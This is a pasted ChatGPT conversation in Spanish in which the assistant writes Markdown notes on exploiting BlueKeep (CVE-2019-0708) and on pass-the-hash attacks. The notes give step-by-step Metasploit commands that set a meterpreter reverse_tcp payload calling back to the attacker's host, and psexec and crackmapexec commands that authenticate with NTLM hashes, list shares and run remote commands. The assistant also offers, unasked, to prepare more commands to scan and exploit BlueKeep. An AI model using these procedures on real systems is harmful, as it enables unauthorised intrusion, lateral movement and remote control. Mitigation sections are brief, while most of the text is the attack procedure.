# BlueKeep (CVE-2019-0708)

## 1. ¿Qué es BlueKeep?

- Vulnerabilidad crítica en el servicio **Remote Desktop Protocol (RDP)** de Windows.
- Permite **ejecución remota de código** sin autenticación previa (wormable).
- Afecta versiones antiguas de Windows sin parches.
- Detectada y parcheada en mayo de 2019.
- Puede propagarse automáticamente, similar a WannaCry.

---

## 2. Versiones de Windows afectadas

- Windows 7 SP1 (todas las ediciones)
- Windows Server 2008 R2
- Windows Server 2008 (sin SP1)
- Windows XP y Windows Server 2003 (aunque no reciben soporte oficial)

---

## 3. Cómo identificar sistemas vulnerables

### a) Usar Nmap con script para BlueKeep

```bash
nmap -p 3389 --script rdp-vuln-ms12-020 <IP_objetivo>
```

Aunque este script es para MS12-020, algunas versiones actualizadas detectan BlueKeep.

### b) Usar herramientas especializadas

- **rdp-sec-check.py** o **rdp-vuln-check** (scripts de Python disponibles en GitHub)
- Escáneres de vulnerabilidades RDP comerciales y de código abierto.

---

## 4. Cómo explotar BlueKeep con Metasploit

### a) Iniciar msfconsole

```bash
msfconsole
```

### b) Seleccionar módulo exploit

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

### c) Configurar opciones básicas

```bash
set RHOSTS <IP_objetivo>
set RPORT 3389
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <tu_IP>
set LPORT <tu_puerto>
```

### d) Ejecutar el exploit

```bash
run
```

Si es exitoso, obtendrás una sesión Meterpreter con control remoto.

---

## 5. ¿Qué hace el exploit?

- Aprovecha una falla en el manejo de solicitudes RDP que permite ejecución remota de código con privilegios SYSTEM.
- No requiere interacción del usuario ni credenciales.
- Puede usarse para desplegar malware, ransomware, o para control remoto completo del sistema.
- La vulnerabilidad es "wormable", lo que significa que puede propagarse automáticamente entre sistemas vulnerables.

---

## 6. Mitigación y recomendaciones

- Aplicar los parches oficiales de Microsoft para CVE-2019-0708 inmediatamente.
- Deshabilitar RDP si no es necesario.
- Configurar firewalls para limitar acceso al puerto 3389.
- Usar VPN y autenticación multifactor para conexiones remotas.

---

## 7. Referencias

- [Microsoft Security Update Guide - CVE-2019-0708](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708)
- [Metasploit BlueKeep Module](https://www.rapid7.com/db/modules/exploit/windows/rdp/cve_2019_0708_bluekeep_rce)

---

¿Quieres que te prepare comandos prácticos para escanear y explotar BlueKeep?




Tú dijiste:
ahora apuntes de pass-the-hash usando msfconsole y crackmapexe


ChatGPT Plus
Claro, aquí tienes unos apuntes en Markdown sobre Pass-the-Hash (PtH), explicando qué es, y cómo usarlo con Metasploit (msfconsole) y crackmapexec:

markdown
Copiar
# Pass-the-Hash (PtH) con Metasploit y CrackMapExec

## 1. ¿Qué es Pass-the-Hash?

- Técnica que permite autenticarse en sistemas Windows sin necesidad de conocer la contraseña en texto claro.
- Se usa el **hash NTLM** de la contraseña para acceder a servicios SMB, RDP, etc.
- Permite movimientos laterales en redes comprometidas.
- Explota la forma en que Windows gestiona la autenticación.

---

## 2. Requisitos previos

- Tener el **hash NTLM** válido de un usuario.
- Acceso a la red o al sistema objetivo.
- Herramientas que soporten autenticación mediante hash (como Metasploit o CrackMapExec).

---

## 3. Uso de Pass-the-Hash en Metasploit (`msfconsole`)

### a) Cargar módulo para sesión SMB con hash

```bash
use exploit/windows/smb/psexec
```

### b) Configurar opciones:

```bash
set RHOSTS <IP_objetivo>
set SMBUser <usuario>
set SMBPass <hash_NTLM>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <tu_IP>
set LPORT <tu_puerto>
```

- Nota: En `SMBPass` se pone el **hash NTLM** precedido por `aad3b435b51404eeaad3b435b51404ee:` si no tienes el hash LM (usualmente se pone solo el hash NTLM con ese prefijo).

### c) Ejecutar el exploit

```bash
run
```

Si es exitoso, tendrás una sesión Meterpreter sin conocer la contraseña en texto plano.

---

## 4. Uso de Pass-the-Hash con CrackMapExec

### a) Comando básico:

```bash
crackmapexec smb <IP_objetivo> -u <usuario> -H <hash_NTLM>
```

- `-H` indica que se usará el hash NTLM para autenticación.

### b) Ejemplo:

```bash
crackmapexec smb 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:5d41402abc4b2a76b9719d911017c592
```

### c) Opcional: Enumerar recursos compartidos o ejecutar comandos con hash

```bash
crackmapexec smb 192.168.1.100 -u Administrator -H <hash> --shares
```

```bash
crackmapexec smb 192.168.1.100 -u Administrator -H <hash> -x 'ipconfig'
```

---

## 5. Mitigación

- Usar autenticación con Kerberos en lugar de NTLM cuando sea posible.
- Aplicar políticas de restricción de uso de hash.
- Monitorizar uso inusual de hashes.
- Actualizar sistemas y aplicar parches.

